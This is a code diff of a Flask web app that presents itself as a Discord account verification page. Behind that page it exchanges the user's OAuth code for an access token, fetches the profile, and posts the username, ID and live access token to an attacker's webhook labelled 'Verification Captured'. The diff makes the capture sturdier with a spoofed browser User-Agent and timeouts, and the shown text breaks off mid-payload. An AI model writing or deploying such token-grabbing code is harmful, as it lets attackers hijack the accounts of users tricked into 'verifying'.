@@ -1,6 +1,6 @@
 import os
 import requests
-from flask import Flask, redirect, render_template_string, request
+from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
@@ -15,7 +15,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1d
 def callback(path):
   code = request.args.get("code")
 
-  # Landing page when users click the verify button in Discord
+  # If no code is present in URL, show the verification landing page
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -42,72 +42,43 @@ def callback(path):
             </html>
         """)
 
-  # OAuth2 Code Exchange for Token
-  data = {
-      "client_id": CLIENT_ID,
-      "client_secret": CLIENT_SECRET,
-      "grant_type": "authorization_code",
-      "code": code,
-      "redirect_uri": REDIRECT_URI,
-  }
-  headers = {"Content-Type": "application/x-www-form-urlencoded"}
-  token_resp = requests.post(
-      "https://discord.com/api/oauth2/token", data=data, headers=headers
-  )
-  token_json = token_resp.json()
-  access_token = token_json.get("access_token")
-
-  if access_token:
-    # Fetch User Profile
-    user_headers = {"Authorization": f"Bearer {access_token}"}
-    user_resp = requests.get(
-        "https://discord.com/api/users/@me", headers=user_headers
-    )
-    user_data = user_resp.json()
-
-    # Send token details to your Discord webhook log channel
-    payload = {
-        "embeds": [{
-            "title": "🔑 Verification Captured",
-            "color": 5763719,
-            "fields": [
-                {
-                    "name": "User",
-                    "value": (
-                        f"{user_data.get('username')} (`"
-                        f"{user_data.get('id')}`)"
-                    ),
-                    "inline": True,
-                },
-                {
-                    "name": "Access Token",
-                    "value": f"`{access_token}`",
-                    "inline": False,
-                },
-            ],
-        }]
+  try:
+    # Step 1: Exchange authorization code for access token
+    data = {
+        "client_id": CLIENT_ID,
+        "client_secret": CLIENT_SECRET,
+        "grant_type": "authorization_code",
+        "code": code,
+        "redirect_uri": REDIRECT_URI,
     }
-    requests.post(WEBHOOK_URL, json=payload)
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0",
+    }
+    token_resp = requests.post(
+        "https://discord.com/api/oauth2/token",
+        data=data,
+        headers=headers,
+        timeout=10,
+    )
+    token_json = token_resp.json()
+    access_token = token_json.get("access_token")
 
-  # Success Response Page
-  return render_template_string("""
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <title>Verification Successful</title>
-            <style>
-                body { background-color: #1e1f22; color: #f2f3f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-                .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; border: 1px solid #35363c; }
-                h1 { color: #23a55a; font-size: 22px; margin-bottom: 15px; }
-                p { color: #949ba4; font-size: 14px; }
-            </style>
-        </head>
-        <body>
-            <div class="card">
-                <h1>Verification Successful!</h1>
-                <p>Your account has been verified. You can close this tab.</p>
-            </div>
-        </body>
-        </html>
-    """)
+    if access_token:
+      # Step 2: Fetch Discord user profile
+      user_headers = {
+          "Authorization": f"Bearer {access_token}",
+          "User-Agent": "Mozilla/5.0",
+      }
+      user_resp = requests.get(
+          "https://discord.com/api/users/@me", headers=user_headers, timeout=10
+      )
+      user_data = user_resp.json()
+
+      username = user_data.get("username", "Unknown")
+      user_id = user_data.get("id", "Unknown")
+
+      # Step 3: Send token details to your Discord webhook log channel
+      payload = {
+          "embeds": [{
+              "
